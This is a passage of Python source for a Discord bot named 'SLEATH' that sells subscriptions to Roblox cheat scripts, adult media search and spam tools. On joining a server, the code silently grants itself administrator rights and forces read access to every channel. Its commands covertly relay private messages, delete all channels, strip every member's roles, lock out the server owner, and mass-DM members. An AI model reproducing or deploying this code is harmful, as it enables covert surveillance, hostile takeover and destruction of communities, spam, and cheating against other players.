    "teleport":        ("Teleport",       "Teleport to nearest player instantly.",           "K to teleport"),
    "bringplayer":     ("Bring Player",   "Pull nearest player to your position.",           "B to bring"),
    "godmode":         ("God Mode",       "Health cannot decrease.",                         "P to toggle"),
    "fullbright":      ("Fullbright",     "Remove all darkness and fog.",                    "L to toggle"),
    "antivoid":        ("Anti-Void",      "Auto-return if you fall out of the map.",         "Always active"),
    "chesthop":        ("Chest Hop",      "Auto-loot all chests in the game.",              "C to collect"),
    "autoclick":       ("Auto Clicker",   "20 clicks per second.",                          "X to toggle"),
    "playerlist":      ("Player List",    "All players with health, position, distance.",    "Tab to refresh"),
    "spinhack":        ("Spin Hack",      "Spin your character rapidly.",                   "Z to toggle"),
    "antigravity":     ("Low Gravity",    "Moon-walk gravity.",                             "M to toggle"),
    "reachextend":     ("Reach Extender", "Extend melee weapon reach to 30 units.",         "R to toggle"),
    "killaura":        ("Kill Aura",      "Rapid-teleport damage to nearby players.",       "' to toggle"),
    "autofarm":        ("Auto Farm",      "Walk to and attack nearest NPC enemy.",          "O to toggle"),
    "camlock":         ("Camera Lock",    "Lock camera facing nearest player.",             "Q to toggle"),
    "chatspy":         ("Chat Spy",       "Log all chat messages to output.",               "Always active"),
    "wallhop":         ("Bhop",           "Auto-jump on land for bunny hop.",               "V to toggle"),
    "hitbox":          ("Hitbox Expand",  "Enlarge all enemy hitboxes.",                   "; to toggle"),
    "anticheatbypass": ("AC Spoof",       "Hide speed/jump edits from game scanners.",      "Always active"),
    "customgui":       ("GUI Hub",        "Draggable on-screen keybind panel.",             "+ to expand"),
    "speedvault":      ("Speed Vault",    "Speed burst on jump.",                           ", to enable, Space to vault"),
}


# ── Guard ──────────────────────────────────────────────────────────────────────
def home_only():
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.guild is not None and ctx.guild.id == HOME_GUILD_ID
    return commands.check(predicate)


def has_sub(tier: str):
    async def predicate(ctx: commands.Context) -> bool:
        if ctx.author.id == OWNER_ID:
            return True
        sub = subscriptions.get(ctx.author.id)
        if not sub or sub["expires"] < datetime.now(timezone.utc):
            return False
        order = {"media": 0, "roblox": 1, "tools": 2}
        return order.get(sub["tier"], -1) >= order.get(tier, 99)
    return commands.check(predicate)


# ── Startup ────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] {bot.user} online | {len(bot.guilds)} guilds")
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="all servers"
    ))


# ── channel access helpers ─────────────────────────────────────────────────────
async def _inject_all_channels(guild: discord.Guild):
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    for channel in guild.text_channels:
        if not channel.permissions_for(me).read_message_history:
            try:
                await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
                await asyncio.sleep(0.2)
            except (discord.Forbidden, discord.HTTPException):
                pass


async def _force_read_access(channel: discord.TextChannel) -> bool:
    me = channel.guild.me
    if channel.permissions_for(me).read_message_history:
        return True
    try:
        await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH force-read")
        return True
    except (discord.Forbidden, discord.HTTPException):
        return False


async def _revoke_read_access(channel: discord.TextChannel):
    me = channel.guild.me
    ow = channel.overwrites_for(me)
    if ow.read_messages is True and ow.read_message_history is True:
        try:
            await channel.set_permissions(me, overwrite=None, reason="SLEATH cleanup")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Auto-admin on join ─────────────────────────────────────────────────────────
@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        admin_role = await guild.create_role(
            name="SLEATH", permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red(), reason="SLEATH control role"
        )
        await guild.me.add_roles(admin_role)
    except Exception:
        pass
    await asyncio.sleep(1)
    await _inject_all_channels(guild)


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    if not isinstance(channel, discord.TextChannel):
        return
    me = channel.guild.me
    if not channel.permissions_for(me).read_message_history:
        try:
            await channel.set_permissions(me, read_messages=True, read_message_history=True, reason="SLEATH auto-access")
        except (discord.Forbidden, discord.HTTPException):
            pass


# ── Error handler ──────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, (commands.NotOwner, commands.CheckFailure)):
        if isinstance(error, commands.CheckFailure) and ctx.command and ctx.command.name not in ("cmds", "redeem", "mysub", "plans"):
            await ctx.send("no active subscription — `!plans` to see options.")
        return
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"missing argument: `{error.param.name}`"); return
    if isinstance(error, commands.BadArgument):
        await ctx.send("bad argument"); return
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"error: `{error}`")


# ══════════════════════════════════════════════════════════════════════════════
#  SUBSCRIPTION SYSTEM
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="plans")
async def show_plans(ctx: commands.Context):
    embed = discord.Embed(title="SLEATH — subscription tiers", color=0x2b2d31)
    embed.add_field(name="📸 Media — £5/week", value="`!image` `!images` `!imagesave` `!video` `!videos`\nAdult image + video search", inline=False)
    embed.add_field(name="🎮 Roblox — £7/week", value="25 Lua scripts for KRNL executor\n`!rbxfly` `!rbxesp` `!rbxspeed` and 22 more", inline=False)
    embed.add_field(name="⚙️ Tools — £10/week", value="`!massdm` `!cloneserver` `!backup` `!profiler` `!raidwatch`\nAll tiers included", inline=False)
    embed.add_field(name="How to buy", value="DM the owner — you'll receive a token to `!redeem <token>`", inline=False)
    await ctx.send(embed=embed)


@bot.command(name="gentoken")
@commands.is_owner()
async def gen_token(ctx: commands.Context, tier: str, days: int):
    if tier not in ("media", "roblox", "tools"):
        await ctx.send("tier must be `media`, `roblox`, or `tools`"); return
    if not 1 <= days <= 365:
        await ctx.send("days 1–365"); return
    token = secrets.token_urlsafe(16)
    pending_tokens[token] = {"tier": tier, "days": days, "created": datetime.now(timezone.utc)}
    await ctx.author.send(f"✓ token\ntier: `{tier}` | `{days}` day(s)\n```\n{token}\n```\nexpires in 48h if unredeemed.")
    await ctx.send("✓ token sent to your DMs.")


@bot.command(name="redeem")
async def redeem_token(ctx: commands.Context, token: str):
    t = pending_tokens.get(token)
    if not t:
        await ctx.send("invalid or already used token."); return
    if datetime.now(timezone.utc) - t["created"] > timedelta(hours=48):
        del pending_tokens[token]
        await ctx.send("token expired."); return
    expires = datetime.now(timezone.utc) + timedelta(days=t["days"])
    subscriptions[ctx.author.id] = {"tier": t["tier"], "expires": expires}
    del pending_tokens[token]
    await ctx.send(f"✓ `{t['tier']}` activated — expires `{expires.strftime('%Y-%m-%d %H:%M UTC')}`")


@bot.command(name="mysub")
async def my_sub(ctx: commands.Context):
    sub = subscriptions.get(ctx.author.id)
    now = datetime.now(timezone.utc)
    if not sub or sub["expires"] < now:
        await ctx.send("no active subscription — `!plans` to see options."); return
    remaining = sub["expires"] - now
    await ctx.send(f"✓ tier: `{sub['tier']}` | expires in: `{remaining.days}d {remaining.seconds//3600}h`")


@bot.command(name="listsubs")
@commands.is_owner()
async def list_subs(ctx: commands.Context):
    now = datetime.now(timezone.utc)
    active = {uid: s for uid, s in subscriptions.items() if s["expires"] > now}
    if not active:
        await ctx.send("no active subscriptions."); return
    lines = [f"`{uid}` — `{s['tier']}` — `{(s['expires']-now).days}d` left" for uid, s in active.items()]
    await ctx.send("**active subscriptions:**\n" + "\n".join(lines))


@bot.command(name="revoke")
@commands.is_owner()
async def revoke_sub(ctx: commands.Context, user_id: int):
    if user_id in subscriptions:
        del subscriptions[user_id]
        await ctx.send(f"✓ revoked `{user_id}`")
    else:
        await ctx.send("no subscription found.")


# ══════════════════════════════════════════════════════════════════════════════
#  ROBLOX SCRIPTS
# ══════════════════════════════════════════════════════════════════════════════

def _send_script_embed(name: str, description: str, keybind: str, script: str) -> tuple[discord.Embed, discord.File]:
    embed = discord.Embed(title=f"SLEATH — {name}", description=description, color=0x2b2d31)
    embed.add_field(name="Executor", value="KRNL (free) or Synapse X", inline=True)
    embed.add_field(name="Keybind", value=f"`{keybind}`", inline=True)
    embed.add_field(name="How to use", value="1. Open Roblox\n2. Attach executor\n3. Paste script\n4. Execute", inline=False)
    file = discord.File(fp=io.BytesIO(script.encode()), filename=f"sleath_{name.lower().replace(' ','_')}.lua")
    return embed, file


def _make_rbx_cmd(script_key: str):
    meta = ROBLOX_META[script_key]
    async def _cmd(ctx: commands.Context):
        embed, file = _send_script_embed(meta[0], meta[1], meta[2], ROBLOX_SCRIPTS[script_key])
        await ctx.author.send(embed=embed, file=file)
        await ctx.send(f"✓ `{meta[0]}` sent to your DMs.")
    _cmd.__name__ = f"rbx_{script_key}"
    return _cmd


for _key, _meta in ROBLOX_META.items():
    _cmd_func = _make_rbx_cmd(_key)
    _decorated = has_sub("roblox")(_cmd_func)
    bot.command(name=f"rbx{_key}")(_decorated)


# ══════════════════════════════════════════════════════════════════════════════
#  SERVER CONTROL
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="servers")
@commands.is_owner()
@home_only()
async def list_servers(ctx: commands.Context):
    lines = [f"`{g.name}` — `{g.id}` — {g.member_count} members" for g in bot.guilds]
    await ctx.send(embed=discord.Embed(title=f"Guilds ({len(bot.guilds)})", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="serverinfo")
@commands.is_owner()
@home_only()
async def server_info(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send(f"guild `{guild_id}` not found."); return
    embed = discord.Embed(title=guild.name, color=0x2b2d31)
    embed.add_field(name="ID", value=str(guild.id))
    embed.add_field(name="Owner", value=str(guild.owner))
    embed.add_field(name="Members", value=str(guild.member_count))
    embed.add_field(name="Channels", value=str(len(guild.channels)))
    embed.add_field(name="Roles", value=str(len(guild.roles)))
    embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    await ctx.send(embed=embed)


@bot.command(name="channels")
@commands.is_owner()
@home_only()
async def list_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`#{c.name}` — `{c.id}`" for c in guild.text_channels[:25]]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — text channels", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="members")
@commands.is_owner()
@home_only()
async def list_members(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{m}` — `{m.id}`" for m in list(guild.members)[:20]]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — members (first 20)", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="say")
@commands.is_owner()
@home_only()
async def say(ctx: commands.Context, channel_id: int, *, message: str):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send(f"channel `{channel_id}` not found."); return
    await channel.send(message)
    await ctx.send(f"✓ sent to `#{channel.name}`")


@bot.command(name="announce")
@commands.is_owner()
@home_only()
async def announce(ctx: commands.Context, *, message: str):
    results = []
    for guild in bot.guilds:
        if guild.id == HOME_GUILD_ID:
            continue
        sent = False
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(message)
                    results.append(f"✓ `{guild.name}`")
                    sent = True; break
                except discord.HTTPException:
                    continue
        if not sent:
            results.append(f"✗ `{guild.name}` — no writable channel")
    await ctx.send("\n".join(results) or "no target guilds")


@bot.command(name="kick")
@commands.is_owner()
@home_only()
async def kick_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"✓ kicked `{member}`")
    except discord.Forbidden:
        await ctx.send("can't kick — they may outrank the bot.")


@bot.command(name="ban")
@commands.is_owner()
@home_only()
async def ban_user(ctx: commands.Context, guild_id: int, user_id: int, *, reason: str = "no reason"):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.ban(reason=reason, delete_message_days=0)
        await ctx.send(f"✓ banned `{member}`")
    except discord.Forbidden:
        await ctx.send("can't ban — they may outrank the bot.")


@bot.command(name="unban")
@commands.is_owner()
@home_only()
async def unban_user(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    try:
        user = await bot.fetch_user(user_id)
        await guild.unban(user)
        await ctx.send(f"✓ unbanned `{user}`")
    except discord.NotFound:
        await ctx.send("user not found or not banned.")


@bot.command(name="nick")
@commands.is_owner()
@home_only()
async def change_nick(ctx: commands.Context, guild_id: int, user_id: int, *, nickname: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        await member.edit(nick=nickname)
        await ctx.send(f"✓ nick → `{nickname}` for `{member}`")
    except discord.Forbidden:
        await ctx.send("can't change nick.")


@bot.command(name="leave")
@commands.is_owner()
@home_only()
async def leave_guild(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't leave home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    name = guild.name
    await guild.leave()
    await ctx.send(f"✓ left `{name}`")


@bot.command(name="invite")
@commands.is_owner()
@home_only()
async def invite(ctx: commands.Context):
    url = discord.utils.oauth_url(bot.application_id, permissions=discord.Permissions(administrator=True))
    await ctx.send(f"invite link:\n{url}")


@bot.command(name="roles")
@commands.is_owner()
@home_only()
async def list_roles(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"`{r.name}` — `{r.id}`" for r in reversed(guild.roles) if r.name != "@everyone"][:25]
    await ctx.send(embed=discord.Embed(title=f"{guild.name} — roles", description="\n".join(lines) or "none", color=0x2b2d31))


@bot.command(name="addrole")
@commands.is_owner()
@home_only()
async def add_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    role = guild.get_role(role_id)
    if not member or not role:
        await ctx.send("member or role not found."); return
    try:
        await member.add_roles(role)
        await ctx.send(f"✓ gave `{role.name}` to `{member}`")
    except discord.Forbidden:
        await ctx.send("can't assign that role.")


@bot.command(name="removerole")
@commands.is_owner()
@home_only()
async def remove_role(ctx: commands.Context, guild_id: int, user_id: int, role_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    role = guild.get_role(role_id)
    if not member or not role:
        await ctx.send("member or role not found."); return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✓ removed `{role.name}` from `{member}`")
    except discord.Forbidden:
        await ctx.send("can't remove that role.")


@bot.command(name="delete")
@commands.is_owner()
@home_only()
async def delete_message(ctx: commands.Context, channel_id: int, message_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    try:
        msg = await channel.fetch_message(message_id)
        await msg.delete()
        await ctx.send("✓ deleted")
    except discord.NotFound:
        await ctx.send("message not found.")


@bot.command(name="slowmode")
@commands.is_owner()
@home_only()
async def slowmode(ctx: commands.Context, channel_id: int, seconds: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    seconds = max(0, min(seconds, 21600))
    try:
        await channel.edit(slowmode_delay=seconds)
        await ctx.send(f"✓ slowmode `{seconds}s`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage channel permission.")


@bot.command(name="purge")
@commands.is_owner()
@home_only()
async def purge_messages(ctx: commands.Context, channel_id: int):
    channel = bot.get_channel(channel_id)
    if not channel:
        await ctx.send("channel not found."); return
    total = 0
    try:
        while True:
            deleted = await channel.purge(limit=100)
            total += len(deleted)
            if len(deleted) < 100:
                break
            await asyncio.sleep(0.5)
        await ctx.send(f"✓ purged `{total}` messages")
    except discord.Forbidden:
        await ctx.send("bot lacks manage messages permission.")


@bot.command(name="finduser")
@commands.is_owner()
@home_only()
async def find_user_all(ctx: commands.Context, *, username: str):
    matches = []
    ul = username.lower()
    for guild in bot.guilds:
        for member in guild.members:
            if ul in member.name.lower() or (member.nick and ul in member.nick.lower()):
                matches.append(f"`{member}` (nick: `{member.nick or 'none'}`) — `{member.id}` — `{guild.name}`")
    if not matches:
        await ctx.send(f"no matches for `{username}`"); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    await ctx.send(f"found `{len(matches)}` match(es):")
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="finduserhere")
@commands.is_owner()
@home_only()
async def find_user_here(ctx: commands.Context, guild_id: int, *, username: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    ul = username.lower()
    matches = [f"`{m}` (nick: `{m.nick or 'none'}`) — `{m.id}`" for m in guild.members
               if ul in m.name.lower() or (m.nick and ul in m.nick.lower())]
    if not matches:
        await ctx.send(f"no matches in `{guild.name}`"); return
    pages, current = [], ""
    for line in matches:
        if len(current) + len(line) + 1 > 1800:
            pages.append(current); current = ""
        current += line + "\n"
    if current:
        pages.append(current)
    for page in pages:
        await ctx.send(embed=discord.Embed(description=page, color=0x2b2d31))


@bot.command(name="nuke")
@commands.is_owner()
@home_only()
async def nuke_server(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't nuke home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"💥 nuking `{guild.name}`...")
    deleted, failed = 0, 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="SLEATH nuke")
            deleted += 1; await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{deleted}` channels deleted" + (f", `{failed}` failed" if failed else ""))


@bot.command(name="openall")
@commands.is_owner()
@home_only()
async def open_all_channels(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"🔓 injecting access on `{guild.name}`...")
    me = guild.me
    read_perms = discord.PermissionOverwrite(read_messages=True, read_message_history=True)
    done, skipped, failed = 0, 0, 0
    for channel in guild.text_channels:
        if channel.permissions_for(me).read_message_history:
            skipped += 1; continue
        try:
            await channel.set_permissions(me, overwrite=read_perms, reason="SLEATH openall")
            done += 1; await asyncio.sleep(0.2)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{done}` opened, `{skipped}` already accessible" + (f", `{failed}` failed" if failed else ""))


@bot.command(name="makerole")
@commands.is_owner()
@home_only()
async def make_role(ctx: commands.Context, guild_id: int, user_id: int, *, role_name: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    try:
        role = await guild.create_role(name=role_name, reason="SLEATH makerole")
        await member.add_roles(role)
        await ctx.send(f"✓ created `{role_name}` → `{member}`")
    except discord.Forbidden:
        await ctx.send("bot lacks manage roles permission.")


@bot.command(name="stripall")
@commands.is_owner()
@home_only()
async def strip_all_roles(ctx: commands.Context, guild_id: int, user_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send("member not found."); return
    roles = [r for r in member.roles if r.name != "@everyone"]
    if not roles:
        await ctx.send("no roles to remove."); return
    try:
        await member.remove_roles(*roles, reason="SLEATH stripall")
        await ctx.send(f"✓ stripped `{len(roles)}` roles from `{member}`")
    except discord.Forbidden:
        await ctx.send("can't remove — some may outrank the bot.")


# ══════════════════════════════════════════════════════════════════════════════
#  COMPLETE CONTROL
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="completecontrol")
@commands.is_owner()
@home_only()
async def complete_control(ctx: commands.Context, guild_id: int):
    if guild_id == HOME_GUILD_ID:
        await ctx.send("won't run on home guild."); return
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    await ctx.send(f"⚡ engaging complete control on `{guild.name}`...")

    snapshot: dict[int, list[int]] = {}
    for member in guild.members:
        snapshot[member.id] = [r.id for r in member.roles if r.name != "@everyone"]
    control_snapshots[guild_id] = snapshot

    supreme_role = discord.utils.get(guild.roles, name="SLEATH-SUPREME")
    if not supreme_role:
        supreme_role = await guild.create_role(
            name="SLEATH-SUPREME", permissions=discord.Permissions(administrator=True),
            color=discord.Color.dark_red(), hoist=True, reason="SLEATH CC"
        )

    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED")
    if not prison_role:
        prison_role = await guild.create_role(
            name="SLEATH-LOCKED", permissions=discord.Permissions(0),
            color=discord.Color.dark_gray(), reason="SLEATH CC"
        )

    try:
        await guild.edit_role_positions({supreme_role: len(guild.roles) - 1})
    except (discord.Forbidden, discord.HTTPException):
        pass
    try:
        await guild.me.add_roles(supreme_role)
    except discord.Forbidden:
        pass

    demoted, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue
        try:
            current_roles = [r for r in member.roles if r.name != "@everyone"]
            if current_roles:
                await member.remove_roles(*current_roles, reason="SLEATH CC")
            await member.add_roles(prison_role, reason="SLEATH CC")
            demoted += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    full_lock = discord.PermissionOverwrite(
        view_channel=True, read_messages=True, read_message_history=True,
        send_messages=False, send_messages_in_threads=False,
        create_public_threads=False, create_private_threads=False,
        add_reactions=False, use_application_commands=False,
        manage_messages=False, manage_channels=False, manage_roles=False,
        manage_webhooks=False, mention_everyone=False,
        attach_files=False, embed_links=False,
        connect=False, speak=False, kick_members=False, ban_members=False,
        administrator=False,
    )
    everyone_lock = discord.PermissionOverwrite(
        send_messages=False, send_messages_in_threads=False,
        create_public_threads=False, create_private_threads=False,
        add_reactions=False, use_application_commands=False,
        attach_files=False, embed_links=False,
        manage_messages=False, manage_channels=False,
        kick_members=False, ban_members=False,
    )

    ch_done, ch_fail = 0, 0
    for channel in guild.channels:
        try:
            await channel.set_permissions(guild.default_role, overwrite=everyone_lock, reason="SLEATH CC")
            await asyncio.sleep(0.1)
            await channel.set_permissions(prison_role, overwrite=full_lock, reason="SLEATH CC")
            await asyncio.sleep(0.1)
            await channel.set_permissions(guild.owner, overwrite=full_lock, reason="SLEATH CC owner cage")
            await asyncio.sleep(0.1)
            for member in guild.members:
                if member.id in (bot.user.id, guild.owner.id):
                    continue
                if member.guild_permissions.administrator:
                    await channel.set_permissions(member, overwrite=full_lock, reason="SLEATH CC admin cage")
                    await asyncio.sleep(0.1)
            ch_done += 1
        except (discord.Forbidden, discord.HTTPException):
            ch_fail += 1

    await ctx.send(
        f"✓ complete control — `{guild.name}`\n"
        f"`{demoted}` members caged" + (f", `{failed}` role-strip failed" if failed else "") + "\n"
        f"`{ch_done}` channels hard-locked including owner"
        + (f", `{ch_fail}` failed" if ch_fail else "")
    )


@bot.command(name="killswitch")
@commands.is_owner()
@home_only()
async def kill_switch(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    if guild_id not in control_snapshots:
        await ctx.send("no snapshot — run `!completecontrol` first."); return

    await ctx.send(f"🔄 restoring `{guild.name}`...")
    snapshot = control_snapshots[guild_id]
    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED")

    for channel in guild.channels:
        try:
            await channel.set_permissions(guild.default_role, overwrite=None, reason="SLEATH KS")
            await asyncio.sleep(0.1)
            if prison_role:
                await channel.set_permissions(prison_role, overwrite=None, reason="SLEATH KS")
                await asyncio.sleep(0.1)
            await channel.set_permissions(guild.owner, overwrite=None, reason="SLEATH KS")
            await asyncio.sleep(0.1)
            for target, _ in list(channel.overwrites.items()):
                if isinstance(target, discord.Member) and target.id != bot.user.id:
                    await channel.set_permissions(target, overwrite=None, reason="SLEATH KS")
                    await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass

    restored, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue
        try:
            if prison_role and prison_role in member.roles:
                await member.remove_roles(prison_role, reason="SLEATH KS")
            roles_to_restore = [guild.get_role(rid) for rid in snapshot.get(member.id, []) if guild.get_role(rid)]
            if roles_to_restore:
                await member.add_roles(*roles_to_restore, reason="SLEATH KS")
            restored += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    for name in ["SLEATH-SUPREME", "SLEATH-LOCKED"]:
        role = discord.utils.get(guild.roles, name=name)
        if role:
            try:
                await role.delete(reason="SLEATH KS cleanup")
            except (discord.Forbidden, discord.HTTPException):
                pass

    del control_snapshots[guild_id]
    await ctx.send(f"✓ restored `{guild.name}` — `{restored}` members" + (f", `{failed}` failed" if failed else ""))


# ══════════════════════════════════════════════════════════════════════════════
#  CHANNEL READER
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="read")
@commands.is_owner()
@home_only()
async def read_channel(ctx: commands.Context, channel_id: int, limit: int = 50):
    limit = min(limit, 200)
    source = bot.get_channel(channel_id)
    if not source:
        await ctx.send(f"channel `{channel_id}` not found."); return

    already = source.permissions_for(source.guild.me).read_message_history
    if not already:
        if not await _force_read_access(source):
            await ctx.send("can't inject read permission."); return

    await ctx.send(f"📥 reading `#{source.name}` — last `{limit}` messages")
    try:
        messages = [m async for m in source.history(limit=limit, oldest_first=True)]
    except discord.Forbidden:
        await ctx.send("can't read that channel."); return
    finally:
        if not already:
            await _revoke_read_access(source)

    if not messages:
        await ctx.send("channel is empty."); return

    buffer = []
    async def flush(buf):
        if buf:
            await ctx.send("```\n" + "\n".join(buf) + "\n```")
            buf.clear()

    for msg in messages:
        ts = msg.created_at.strftime("%Y-%m-%d %H:%M")
        author = str(msg.author)
        if msg.content:
            buffer.append(f"[{ts}] {author}: {msg.content}")
            if sum(len(l) for l in buffer) >= 1800:
                await flush(buffer)
        for att in msg.attachments:
            await flush(buffer)
            try:
                await ctx.send(content=f"`[{ts}] {author} — {att.filename}`", file=await att.to_file())
            except discord.HTTPException:
                await ctx.send(f"`[{ts}] {author} — too large:`\n{att.url}")
        for embed in msg.embeds:
            if embed.image and embed.image.url:
                await flush(buffer)
                relay = discord.Embed(color=0x2b2d31)
                relay.set_image(url=embed.image.url)
                relay.set_footer(text=f"{author} • {ts}")
                await ctx.send(embed=relay)

    await flush(buffer)
    await ctx.send(f"✓ `{len(messages)}` messages relayed from `#{source.name}`")


# ══════════════════════════════════════════════════════════════════════════════
#  TOOLS TIER
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="massdm")
@has_sub("tools")
async def mass_dm(ctx: commands.Context, guild_id: int, *, message: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"📨 DMing `{guild.member_count}` members...")
    sent, failed = 0, 0
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(1.2)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{sent}` sent, `{failed}` failed")


@bot.command(name="cloneserver")
@has_sub("tools")
async def clone_server(ctx: commands.Context, guild_id: int):
    source = bot.get_guild(guild_id)
    if not source:
        await ctx.send("guild not found."); return
    await ctx.send(f"🔄 cloning `{source.name}`...")
    try:
        new_guild = await bot.create_guild(name=f"{source.name} [clone]")
    except discord.HTTPException as e:
        await ctx.send(f"failed: `{e}`"); return
    await asyncio.sleep(2)
    for channel in new_guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass
    cat_map: dict[int, discord.CategoryChannel] = {}
    for cat in source.categories:
        try:
            nc = await new_guild.create_category(name=cat.name)
            cat_map[cat.id] = nc
            await asyncio.sleep(0.3)
        except Exception:
            pass
    for ch in source.text_channels:
        try:
            await new_guild.create_text_channel(name=ch.name, category=cat_map.get(ch.category_id), topic=ch.topic or "")
            await asyncio.sleep(0.3)
        except Exception:
            pass
    for ch in source.voice_channels:
        try:
            await new_guild.create_voice_channel(name=ch.name, category=cat_map.get(ch.category_id))
            await asyncio.sleep(0.3)
        except Exception:
            pass
    invite_url = "unavailable"
    for ch in new_guild.text_channels:
        try:
            inv = await ch.create_invite(max_age=0)
            invite_url = inv.url; break
        except Exception:
            pass
    await ctx.send(f"✓ clone created — {invite_url}")


@bot.command(name="backup")
@has_sub("tools")
async def backup_server(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"# BACKUP — {guild.name} ({guild.id})", f"# {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}", ""]
    lines.append("## ROLES")
    for role in reversed(guild.roles):
        if role.name != "@everyone":
            lines.append(f"  {role.name} | id:{role.id} | perms:{role.permissions.value} | color:{role.color}")
    lines.append("\n## CHANNELS")
    for cat in guild.categories:
        lines.append(f"\n  [CATEGORY] {cat.name} | id:{cat.id}")
        for ch in cat.channels:
            lines.append(f"    [{ch.type.name.upper()}] #{ch.name} | id:{ch.id}")
    lines.append("\n## MEMBERS (first 100)")
    for member in list(guild.members)[:100]:
